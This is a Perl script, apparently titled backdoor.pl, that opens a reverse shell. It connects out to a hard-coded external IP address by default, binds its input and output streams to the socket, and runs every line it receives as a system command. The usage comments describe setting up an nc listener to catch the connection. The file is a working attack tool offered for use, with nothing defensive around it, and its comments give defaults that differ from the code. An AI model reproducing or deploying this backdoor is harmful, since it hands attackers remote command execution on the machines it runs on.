#!/usr/bin/perl

 #usage:

 #nc -vv -l -p PORT(default 1988) on your local system first,then

 #Perl $0 Remote IP(default 127.0.0.1) Remote_port(default 1988)

 #Type 'exit' to exit or press Enter to gain shell when u under the 'console'.

 #nc -vv -l -p 1988

 #perl backdoor.pl 127.0.0.1 1987


 #use strict;

  use Socket;

  use IO::Socket;

  use Cwd;

  use IO::Handle;

  my $remote = $ARGV[0]|| "104.224.150.54";

  my $remote_port = $ARGV[1]|| 1987;

  my $pack_addr = sockaddr_in( $remote_port, inet_aton($remote));

  my $path = cwd();

  $ARGC = @ARGV;

  if ($ARGV[0]!~/-/)

  {

  socket(SOCKET, PF_INET, SOCK_STREAM,getprotobyname('tcp')) or die "socket error: ";

  STDOUT->autoflush(1);

  SOCKET->autoflush(1);

  $conn=connect(SOCKET,$pack_addr)||die "connection error : $!";

  open STDIN,">&SOCKET";

  open STDOUT,">&SOCKET";

  open STDERR,">&SOCKET";

  print "You are in $path\n";

  print "Welcome to use.\n";

  print "console>\n";


  while (<STDIN>) {

  chomp;

  if( lc($_) eq 'exit' ) {

  print " Bye Bye!";

  exit;

  }

  $msg=system($_);

  if($msg){

  print STDOUT "\n$msg\n";

  print STDOUT "console>";

  }else

  {

  print "console>";

  }

  }

  close SOCKET;

  exit;

  }